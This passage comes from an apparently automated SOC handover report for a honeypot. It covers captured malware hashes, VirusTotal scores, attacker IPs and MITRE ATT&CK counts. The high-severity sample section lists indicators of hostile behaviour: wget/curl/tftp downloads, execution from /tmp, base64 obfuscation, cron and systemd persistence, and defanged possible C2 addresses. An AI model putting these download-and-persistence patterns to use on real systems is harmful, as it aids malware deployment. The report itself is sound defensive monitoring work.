| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `14.103.103[.]211` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 39 |
| `2.57.122[.]238` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `69.6.222[.]101` | BR | Newfold Digital, Inc. | **100** ⚠️ | 35 |
| `221.156.173[.]44` | KR | Korea Telecom | **100** ⚠️ | 1 |
| `112.163.135[.]25` | KR | Korea Telecom | **100** ⚠️ | 8 |
| `86.127.235[.]148` | ES | DIGI Spain Telecom | **100** ⚠️ | 2 |
| `125.142.253[.]123` | KR | Korea Telecom | **100** ⚠️ | 20 |
| `91.220.204[.]13` | UA | Teleradiocompaniya Eliton LLC | **100** ⚠️ | 4 |
| `181.231.196[.]74` | AR | Telecom Argentina S.A. | **100** ⚠️ | 2 |
| `3.87.196[.]69` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 25 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 221 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 178 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 57 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 56 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 9 |

---

## 🔕 False Positive Summary (57 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 24 |
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 382 cases |
| Tool 34  | Credential Extractor        | ✅ 1757 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 32 fingerprints |
| Tool 36  | Command Clustering          | ✅ 20 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 240 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 57 filtered (14.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 113 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 34 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 169 priority case(s) shown individually · 141 recon entry/entries in table (11 group(s) consolidating 26 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-20T16:01:31Z_
